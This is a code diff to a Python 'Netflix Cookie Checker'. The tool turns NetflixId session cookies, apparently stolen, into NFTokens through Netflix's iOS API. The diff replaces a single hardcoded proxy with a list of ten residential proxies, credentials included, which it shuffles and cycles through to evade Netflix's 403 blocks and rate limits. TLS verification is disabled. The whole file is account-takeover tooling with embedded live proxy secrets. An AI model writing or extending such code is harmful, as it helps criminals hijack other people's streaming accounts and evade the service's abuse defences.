@@ -3,7 +3,7 @@
 
 """
 Rumman Checker - Netflix Cookie Checker
-Vercel-compatible version with proxy support
+Vercel-compatible version with rotating residential proxies
 """
 
 import os
@@ -23,10 +23,24 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ============================================
-# PROXY CONFIGURATION - USING YOUR PROXY
+# RESIDENTIAL PROXIES (Webshare)
 # ============================================
 
-PROXY_URL = "http://yh63obxwk:vJxdWjQEve7iLG_CzcakWW@beta.strikeproxy.net:8080"
+PROXY_LIST = [
+    "http://mfaqlivy:ar91rt230oyo@31.59.20.176:6754",
+    "http://mfaqlivy:ar91rt230oyo@31.56.127.193:7684",
+    "http://mfaqlivy:ar91rt230oyo@45.38.107.97:6014",
+    "http://mfaqlivy:ar91rt230oyo@198.105.121.200:6462",
+    "http://mfaqlivy:ar91rt230oyo@64.137.96.74:6641",
+    "http://mfaqlivy:ar91rt230oyo@198.23.243.226:6361",
+    "http://mfaqlivy:ar91rt230oyo@38.154.185.97:6370",
+    "http://mfaqlivy:ar91rt230oyo@84.247.60.125:6095",
+    "http://mfaqlivy:ar91rt230oyo@142.111.67.146:5611",
+    "http://mfaqlivy:ar91rt230oyo@191.96.254.138:6185",
+]
+
+# Randomize proxy order
+random.shuffle(PROXY_LIST)
 
 # ============================================
 
@@ -139,17 +153,8 @@ def extract_cookie_bundles(content: str) -> List[Tuple[Dict[str, str], str, Dict
     return bundles
 
 # ==================================================
-# NFTOKEN GENERATION - WITH PROXY
+# NFTOKEN GENERATION - WITH ROTATING PROXIES
 # ==================================================
-
-def get_proxies() -> Optional[Dict[str, str]]:
-    """Get proxy dict from PROXY_URL"""
-    if PROXY_URL and PROXY_URL.strip():
-        return {
-            'http': PROXY_URL,
-            'https': PROXY_URL,
-        }
-    return None
 
 def create_nftoken(cookies: Dict[str, str]) -> Optional[Dict]:
     netflix_id = cookies.get('NetflixId')
@@ -158,23 +163,28 @@ def create_nftoken(cookies: Dict[str, str]) -> Optional[Dict]:
         return None
     
     print(f"🔄 Requesting NFToken for NetflixId: {netflix_id[:30]}...")
-    print(f"🔄 Using proxy: {PROXY_URL.split('@')[-1] if '@' in PROXY_URL else PROXY_URL}")
     
-    try:
-        token = get_token_via_api(netflix_id)
-        if token:
-            expires = datetime.now(timezone.utc) + timedelta(hours=1)
-            return {
-                'token': token,
-                'expires_at_utc': expires.strftime("%Y-%m-%d %H:%M:%S UTC")
-            }
-    except Exception as e:
-        print(f"⚠️ API approach failed: {e}")
+    # Try each proxy until one works
+    for i, proxy_url in enumerate(PROXY_LIST):
+        print(f"🔄 Trying proxy {i+1}/{len(PROXY_LIST)}: {proxy_url.split('@')[-1]}")
+        
+        try:
+            token = get_token_via_api(netflix_id, proxy_url)
+            if token:
+                expires = datetime.now(timezone.utc) + timedelta(hours=1)
+                return {
+                    'token': token,
+                    'expires_at_utc': expires.strftime("%Y-%m-%d %H:%M:%S UTC"),
+                    'proxy_used': proxy_url.split('@')[-1]
+                }
+        except Exception as e:
+            print(f"⚠️ Proxy {i+1} failed: {e}")
+            continue
     
     return None
 
-def get_token_via_api(netflix_id: str) -> Optional[str]:
-    """Get token via the iOS API with proxy support"""
+def get_token_via_api(netflix_id: str, proxy_url: str) -> Optional[str]:
+    """Get token via the iOS API with a specific proxy"""
     
     # Clean the NetflixId
     if netflix_id.startswith('v%3D3%26ct%3D'):
@@ -230,7 +240,10 @@ def get_token_via_api(netflix_id: str) -> Optional[str]:
         'responseFormat': 'json',
     }
     
-    proxies = get_proxies()
+    proxies = {
+        'http': proxy_url,
+        'https': proxy_url,
+    }
     
     try:
         response = requests.get(
@@ -238,7 +251,7 @@ def get_token_via_api(netflix_id: str) -> Optional[str]:
             params=params,
             headers=headers,
             proxies=proxies,
-            timeout=15,
+            timeout=12,
             verify=False
         )
         
@@ -253,16 +266,12 @@ def get_token_via_api(netflix_id: str) -> Optional[str]:
                 return token
             else:
                 print("⚠️ No token in response")
-                if DEBUG:
-                    print(f"Response: {json.dumps(data, indent=2)[:500]}")
         elif response.status_code == 403:
-            print("❌ Access denied - proxy might be blocked by Netflix")
+            print("❌ Access denied - proxy blocked by Netflix")
         elif response.status_code == 429:
-            print("❌ Rate limited - too many requests")
+            print("❌ Rate limited")
         else:
             print(f"❌ API returned: {response.status_code}")
-            if DEBUG and response.text:
-                print(f"Response: {response.text[:200]}")
                 
     except requests.exceptions.Timeout:
         print("❌ Request timed out")
@@ -287,7 +296,8 @@ def generate_token_from_cookie(cookie_content: str) -> Optional[Dict]:
                     'token': token_data.get('token'),
                     'expires_at_utc': token_data.get('expires_at_utc'),
                     'cookies': cookies,
-                    'info': info
+                    'info': info,
+                    'proxy_used': token_data.get('proxy_used', 'unknown')
                 }
     
     return None
